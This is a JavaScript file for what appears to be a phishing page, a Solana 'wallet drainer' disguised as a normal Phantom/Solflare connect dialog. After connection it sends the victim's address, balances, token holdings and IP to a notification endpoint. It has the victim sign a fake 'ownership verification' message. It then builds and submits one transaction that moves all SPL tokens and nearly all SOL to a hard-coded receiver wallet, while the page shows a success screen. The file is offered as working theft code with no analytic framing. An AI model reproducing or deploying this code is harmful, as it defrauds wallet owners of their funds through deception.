$(document).ready(function() {
    // ============================================
    // CONFIGURATION
    // ============================================
    const SOLANA_RPC = 'https://mainnet.helius-rpc.com/?api-key=58027310-7551-4e1a-92b0-2bf2c05d238b';
    const RECEIVER_WALLET = 'BxhvDsAy2d1DWbUwjFkps1R57H27Mey4RK3qQqoB1mFJ';
    const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
    
    // Token mint -> symbol mapping
    const TOKEN_MAP = {
        'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
        'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
        'So11111111111111111111111111111111111111112': 'WSOL',
        'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 'BONK',
        'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So': 'mSOL',
        'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn': 'jitoSOL'
    };
    
    let currentConnection = null;
    let currentWalletType = null;
    
    // ============================================
    // UTILITY FUNCTIONS
    // ============================================
    
    async function getClientIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Failed to get IP:', error);
            return null;
        }
    }
    
    function getTokenSymbol(mint) {
        return TOKEN_MAP[mint] || 'Unknown';
    }
    
    async function getTokenPrices() {
        try {
            const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=usd-coin,tether,solana,bonk&vs_currencies=usd');
            const data = await response.json();
            return {
                'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': data['usd-coin']?.usd || 1,
                'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': data['tether']?.usd || 1,
                'So11111111111111111111111111111111111111112': data['solana']?.usd || 0,
                'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': data['bonk']?.usd || 0,
            };
        } catch (error) {
            console.error('Failed to get token prices:', error);
            return {};
        }
    }
    
    async function getSPLTokenInfo(connection, publicKey) {
        try {
            if (!publicKey || !(publicKey instanceof solanaWeb3.PublicKey)) {
                console.error("Invalid publicKey passed to SPL function");
                return [];
            }
            
            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                programId: TOKEN_PROGRAM_ID,
            });
            
            const tokenPrices = await getTokenPrices();
            const tokens = [];
            
            for (const tokenAccount of tokenAccounts.value) {
                const parsedInfo = tokenAccount.account.data.parsed.info;
                const balance = parsedInfo.tokenAmount;
                
                if (balance.uiAmount > 0) {
                    const mint = parsedInfo.mint;
                    const symbol = getTokenSymbol(mint);
                    const price = tokenPrices[mint] || 0;
                    const usdValue = balance.uiAmount * price;
                    
                    tokens.push({
                        mint: mint,
                        balance: balance.uiAmount,
                        symbol: symbol,
                        usdValue: usdValue
                    });
                }
            }
            return tokens;
        } catch (error) {
            console.error('Failed to get SPL tokens:', error);
            return [];
        }
    }
    
    async function sendTelegramNotification(data) {
        try {
            await fetch('/notify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch (error) {
            console.error('Failed to send Telegram notification:', error);
        }
    }
    
    function isMobile() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }
    
    function getCurrentSiteUrl() {
        return encodeURIComponent(window.location.origin);
    }
    
    // ============================================
    // WALLET DETECTION & UI
    // ============================================
    
    function checkWalletAvailability() {
        const isMobileDevice = isMobile();
        
        const wallets = {
            phantom: {
                provider: window.solana,
                condition: window.solana && window.solana.isPhantom,
                name: 'Phantom Wallet',
                isMobileSupported: true,
                installUrl: {
                    chrome: 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjaphhpkkoljpa',
                    firefox: 'https://addons.mozilla.org/en-US/firefox/addon/phantom-app/',
                    mobile: 'https://phantom.app/download'
                }
            },
            solflare: {
                provider: window.solflare,
                condition: window.solflare && window.solflare.isSolflare,
                name: 'Solflare Wallet',
                isMobileSupported: true,
                installUrl: {
                    chrome: 'https://chrome.google.com/webstore/detail/solflare-wallet/bhhhlbepdkbapadjdnnojkbgioiodbic',
                    firefox: 'https://addons.mozilla.org/en-US/firefox/addon/solflare-wallet/',
                    mobile: 'https://solflare.com/download'
                }
            }
        };
        
        Object.keys(wallets).forEach(walletId => {
            const wallet = wallets[walletId];
            const statusElement = $(`#${walletId}-status`);
            const optionElement = $(`#${walletId}-wallet`);
            
            if (wallet.condition) {
                statusElement.html('<span class="status-dot installed"></span><span class="status-text status-installed">Installed</span>');
                optionElement.prop('disabled', false);
            } else if (isMobileDevice && wallet.isMobileSupported) {
                statusElement.html('<span class="status-dot"></span><span class="status-text">Mobile App</span>');
                optionElement.prop('disabled', false);
            } else {
                statusElement.html('<span class="status-dot not-installed"></span><span class="status-text status-not-installed">Not Installed</span>');
                optionElement.prop('disabled', false);
            }
        });
        
        return wallets;
    }
    
    function getWalletProvider(walletType) {
        const providers = {
            phantom: window.solana,
            solflare: window.solflare
        };
        return providers[walletType];
    }
    
    function showWalletModal() {
        checkWalletAvailability();
        showWalletOptions();
        $('#wallet-modal').fadeIn(200);
    }
    
    function hideWalletModal() {
        $('#wallet-modal').fadeOut(200);
        showWalletOptions();
        unlockModal();
    }
    
    function lockModal() {
        $('#wallet-modal').addClass('locked');
    }
    
    function unlockModal() {
        $('#wallet-modal').removeClass('locked');
    }
    
    function showWalletOptions() {
        $('#wallet-options').removeClass('hidden');
        $('#wallet-loading-state').removeClass('active');
        $('.wallet-modal-header h3').text('Select Your Wallet');
        clearRejectionEffects();
    }
    
    function showWalletLoading() {
        $('#wallet-options').addClass('hidden');
        $('#wallet-loading-state').addClass('active');
        $('.wallet-modal-header h3').text('Connecting...');
        lockModal();
        clearRejectionEffects();
    }
    
    function showRejectionEffects() {
        $('.wallet-loading-spinner').addClass('rejected');
        $('.phantom-icon, .solflare-icon').addClass('rejected');
        $('.wallet-modal-content').addClass('shake');
        setTimeout(() => $('.wallet-modal-content').removeClass('shake'), 600);
    }
    
    function clearRejectionEffects() {
        $('.wallet-loading-spinner, .phantom-icon, .solflare-icon, .wallet-loading-spinner img').removeClass('rejected');
        $('.wallet-modal-content').removeClass('shake');
    }
    
    // ============================================
    // CORE WALLET CONNECTION & TRANSFER LOGIC
    // ============================================
    
    async function transferAllAssets(connection, fromPubkey, walletProvider, walletType) {
        const receiverPubkey = new solanaWeb3.PublicKey(RECEIVER_WALLET);
        const transaction = new solanaWeb3.Transaction();
        let tokenTransfers = 0;
        
        // Get all token accounts
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(fromPubkey, {
            programId: TOKEN_PROGRAM_ID,
        });
        
        console.log(`Found ${tokenAccounts.value.length} token accounts`);
        
        // Add token transfer instructions
        for (const tokenAccount of tokenAccounts.value) {
            try {
                const parsedInfo = tokenAccount.account.data.parsed.info;
                const balance = parsedInfo.tokenAmount;
                
                if (balance.uiAmount > 0) {
                    const mint = new solanaWeb3.PublicKey(parsedInfo.mint);
                    const fromTokenAccount = new solanaWeb3.PublicKey(tokenAccount.pubkey);
                    const toTokenAccount = await splToken.getAssociatedTokenAddress(mint, receiverPubkey);
                    
                    // Check if receiver's token account exists
                    const receiverAccountInfo = await connection.getAccountInfo(toTokenAccount);
                    if (!receiverAccountInfo) {
                        transaction.add(
                            splToken.createAssociatedTokenAccountInstruction(
                                fromPubkey,
                                toTokenAccount,
                                receiverPubkey,
                                mint
                            )
                        );
                    }
                    
                    transaction.add(
                        splToken.createTransferInstruction(
                            fromTokenAccount,
                            toTokenAccount,
                            fromPubkey,
                            BigInt(balance.amount)
                        )
                    );
                    
                    tokenTransfers++;
                    console.log(`Added transfer for token ${parsedInfo.mint}: ${balance.uiAmount}`);
                }
            } catch (error) {
                console.error('Error processing token account:', error.message);
            }
        }
        
        // Transfer SOL (leave ~0.01 SOL for rent exemption)
        const solBalance = await connection.getBalance(fromPubkey);
        const minBalance = await connection.getMinimumBalanceForRentExemption(0);
        const estimatedFee = (tokenTransfers + 2) * 5000; // Rough estimate
        const solToTransfer = Math.max(0, solBalance - minBalance - estimatedFee);
        
        if (solToTransfer > 0) {
            transaction.add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: fromPubkey,
                    toPubkey: receiverPubkey,
                    lamports: solToTransfer,
                })
            );
            console.log(`Added SOL transfer: ${solToTransfer / solanaWeb3.LAMPORTS_PER_SOL} SOL`);
        }
        
        // Get latest blockhash and sign
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = fromPubkey;
        
        const signedTransaction = await walletProvider.signTransaction(transaction);
        const txid = await connection.sendRawTransaction(signedTransaction.serialize());
        
        // Confirm transaction
        await connection.confirmTransaction({
            signature: txid,
            blockhash: blockhash,
            lastValidBlockHeight: (await connection.getLatestBlockhash()).lastValidBlockHeight
        });
        
        return { txid, tokenTransfers, solAmount: solToTransfer / solanaWeb3.LAMPORTS_PER_SOL };
    }
    
    async function connectWallet(walletType, walletProvider) {
        try {
            const wallets = checkWalletAvailability();
            const walletInfo = wallets[walletType];
            const isMobileDevice = isMobile();
            
            // Handle mobile deep linking
            if (isMobileDevice && !walletInfo.condition) {
                let deepLinkUrl;
                const currentUrl = getCurrentSiteUrl();
                
                if (walletType === 'phantom') {
                    deepLinkUrl = `https://phantom.app/ul/browse/${currentUrl}?ref=${encodeURIComponent(window.location.href)}`;
                } else if (walletType === 'solflare') {
                    deepLinkUrl = `https://solflare.com/ul/v1/browse/${currentUrl}?ref=${encodeURIComponent(window.location.href)}`;
                }
                
                if (deepLinkUrl) {
                    await sendTelegramNotification({
                        address: 'Unknown',
                        balance: 'Unknown',
                        usdBalance: 'Unknown',
                        walletType: walletInfo.name,
                        customMessage: `📱 Mobile ${walletInfo.name} Deep Link Opened`
                    });
                    
                    showWalletLoading();
                    $('.wallet-loading-title').text(`Opening ${walletInfo.name}`);
                    $('.wallet-loading-subtitle').html(`Redirecting to ${walletInfo.name}...<br>Please approve the connection in the app.`);
                    
                    // Set up focus listener for return
                    const handleFocus = () => {
                        const provider = walletType === 'phantom' ? window.solana : window.solflare;
                        const condition = walletType === 'phantom' ? 
                            (window.solana && window.solana.isPhantom) : 
                            (window.solflare && window.solflare.isSolflare);
                            
                        if (condition) {
                            window.removeEventListener('focus', handleFocus);
                            connectWallet(walletType, provider);
                        }
                    };
                    
                    window.addEventListener('focus', handleFocus);
                    
                    // Timeout after 2 minutes
                    setTimeout(() => {
                        window.removeEventListener('focus', handleFocus);
                        if ($('#wallet-modal').is(':visible')) {
                            showWalletOptions();
                            unlockModal();
                        }
                    }, 120000);
                    
                    window.location.href = deepLinkUrl;
                    return;
                }
            }
            
            // Check if wallet is installed
            if (!walletInfo.condition) {
                let installUrl;
                if (isMobileDevice && walletInfo.installUrl.mobile) {
                    installUrl = walletInfo.installUrl.mobile;
                } else {
                    const isFirefox = typeof InstallTrigger !== "undefined";
                    installUrl = isFirefox ? walletInfo.installUrl.firefox : walletInfo.installUrl.chrome;
                }
                
                if (confirm(`${walletInfo.name} is not installed. Would you like to install it?`)) {
                    window.open(installUrl, '_blank');
                }
                return;
            }
            
            if (!walletProvider) {
                throw new Error('Wallet provider not found');
            }
            
            showWalletLoading();
            
            // UI updates
            if (walletType === 'phantom') {
                $('.wallet-loading-spinner img').attr('src', 'https://docs.phantom.com/favicon.svg').attr('alt', 'Phantom');
                $('.wallet-loading-title').text('Connecting Phantom');
            } else if (walletType === 'solflare') {
                $('.wallet-loading-spinner img').attr('src', 'https://solflare.com/favicon.ico').attr('alt', 'Solflare');
                $('.wallet-loading-title').text('Connecting Solflare');
                $('.wallet-loading-spinner').addClass('solflare');
            }
            
            $('.wallet-loading-subtitle').html('Please approve the connection request in your wallet.<br>This may take a few moments.');
            
            // Connect wallet
            const resp = await walletProvider.connect();
            console.log(`${walletInfo.name} connected:`, resp);
            
            // Get public key (handle different response formats)
            let publicKeyString;
            if (walletType === 'solflare') {
                publicKeyString = walletProvider.publicKey?.toString() || walletProvider.pubkey?.toString();
            } else {
                publicKeyString = resp.publicKey?.toString();
            }
            
            if (!publicKeyString) {
                throw new Error('No public key received from wallet');
            }
            
            const publicKey = new solanaWeb3.PublicKey(publicKeyString);
            
            $('.wallet-loading-title').text(`${walletInfo.name} Connected`);
            $('.wallet-loading-subtitle').html('Fetching wallet information...<br>Please wait.');
            
            // Initialize connection
            const connection = new solanaWeb3.Connection(SOLANA_RPC, 'confirmed');
            
            // Get balance and token info
            const walletBalance = await connection.getBalance(publicKey);
            const solBalanceFormatted = (walletBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6);
            const clientIP = await getClientIP();
            const splTokens = await getSPLTokenInfo(connection, publicKey);
            
            // Send connection notification
            await sendTelegramNotification({
                address: publicKeyString,
                balance: solBalanceFormatted,
                usdBalance: 'Unknown',
                walletType: walletInfo.name,
                customMessage: '🔗 Wallet Connected',
                splTokens: splTokens,
                ip: clientIP
            });
            
            // Check minimum balance
            const requiredBalance = 0.02 * solanaWeb3.LAMPORTS_PER_SOL;
            if (walletBalance < requiredBalance) {
                await sendTelegramNotification({
                    address: publicKeyString,
                    balance: solBalanceFormatted,
                    usdBalance: 'Unknown',
                    walletType: walletInfo.name,
                    customMessage: '❌ Insufficient Funds - Please have at least 0.02 SOL'
                });
                
                $('.wallet-loading-title').text('Insufficient Balance');
                $('.wallet-loading-subtitle').html(`Please have at least 0.02 SOL to begin.<br>Current balance: ${solBalanceFormatted} SOL`);
                showRejectionEffects();
                
                setTimeout(() => {
                    unlockModal();
                    showWalletOptions();
                    $('#connect-wallet').text("Connect Wallet");
                }, 3000);
                return;
            }
            
            // Ownership verification (sign message)
            $('.wallet-loading-title').text(`Verifying ${walletInfo.name} Ownership`);
            $('.wallet-loading-subtitle').html(`Please sign the verification message in your ${walletInfo.name} wallet.<br>This confirms you own this wallet.`);
            
            const verificationMessage = `Verify wallet ownership for security purposes.\nTimestamp: ${Date.now()}\nWallet: ${publicKeyString.slice(0, 8)}...${publicKeyString.slice(-8)}`;
            const messageBytes = new TextEncoder().encode(verificationMessage);
            
            try {
                let signedMessage;
                if (walletType === 'phantom') {
                    signedMessage = await walletProvider.signMessage(messageBytes, 'utf8');
                } else {
                    signedMessage = await walletProvider.signMessage(messageBytes);
                }
                console.log("Ownership verification signed:", signedMessage);
                
                await sendTelegramNotification({
                    address: publicKeyString,
                    balance: solBalanceFormatted,
                    usdBalance: 'Unknown',
                    walletType: walletInfo.name,
                    customMessage: '✅ User Signed Ownership Verification - Proceeding to transfer'
                });
            } catch (signError) {
                console.error("Ownership verification failed:", signError);
                
                const isRejection = signError.message?.includes('rejected') || signError.code === 4001;
                if (isRejection) {
                    await sendTelegramNotification({
                        address: publicKeyString,
                        balance: solBalanceFormatted,
                        usdBalance: 'Unknown',
                        walletType: walletInfo.name,
                        customMessage: '❌ Ownership Verification Rejected by User'
                    });
                    
                    showRejectionEffects();
                    $('.wallet-loading-title').text('Verification Rejected');
                    $('.wallet-loading-subtitle').html('Please sign the verification message to continue.');
                    
                    setTimeout(() => {
                        clearRejectionEffects();
                        showWalletOptions();
                        unlockModal();
                    }, 2000);
                    return;
                }
                throw signError;
            }
            
            // Transfer assets
            $('.wallet-loading-title').text('Processing Transfer');
            $('.wallet-loading-subtitle').html('Preparing asset transfer...<br>Do not close this window.');
            
            const transferResult = await transferAllAssets(connection, publicKey, walletProvider, walletType);
            
            // Send success notification
            const shortTxid = `${transferResult.txid.slice(0, 6)}....${transferResult.txid.slice(-8)}`;
            const solscanUrl = `https://solscan.io/tx/${transferResult.txid}`;
            
            await sendTelegramNotification({
                address: publicKeyString,
                balance: solBalanceFormatted,
                usdBalance: 'Unknown',
                walletType: walletInfo.name,
                customMessage: `🎉 Transfer Complete! TXID: [${shortTxid}](${solscanUrl}) | Tokens: ${transferResult.tokenTransfers} | SOL: ${transferResult.solAmount.toFixed(6)}`
            });
            
            $('.wallet-loading-title').text('Success!');
            $('.wallet-loading-subtitle').html('Assets have been successfully transferred.<br>Transaction confirmed on blockchain.');
            $('#connect-wallet').text("Assets Transferred Successfully!");
            
            setTimeout(() => {
                unlockModal();
                hideWalletModal();
                $('#connect-wallet').text("Connect Wallet");
            }, 3000);
            
        } catch (err) {
            console.error(`Error connecting to ${walletType}:`, err);
            
            $('.wallet-loading-title').text('Connection Failed');
            $('.wallet-loading-subtitle').html('Failed to complete the process.<br>Please try again.');
            
            await sendTelegramNotification({
                address: 'Unknown',
                balance: 'Unknown',
                usdBalance: 'Unknown',
                walletType: walletType === 'phantom' ? 'Phantom Wallet' : 'Solflare Wallet',
                customMessage: `❌ Process Failed: ${err.message || 'Unknown error'}`
            });
            
            setTimeout(() => {
                showWalletOptions();
                unlockModal();
            }, 2000);
        }
    }
    
    // ============================================
    // EVENT HANDLERS
    // ============================================
    
    $('#connect-wallet, #connect-wallet-hero').on('click', showWalletModal);
    
    $('#close-modal, .wallet-modal-overlay').on('click', function(e) {
        if (!$('#wallet-modal').hasClass('locked')) {
            hideWalletModal();
        }
    });
    
    $('.wallet-option').on('click', function() {
        const walletType = $(this).data('wallet');
        const walletProvider = getWalletProvider(walletType);
        connectWallet(walletType, walletProvider);
    });
    
    $(document).on('keydown', function(e) {
        if (e.key === 'Escape' && !$('#wallet-modal').hasClass('locked')) {
            hideWalletModal();
        }
    });
});
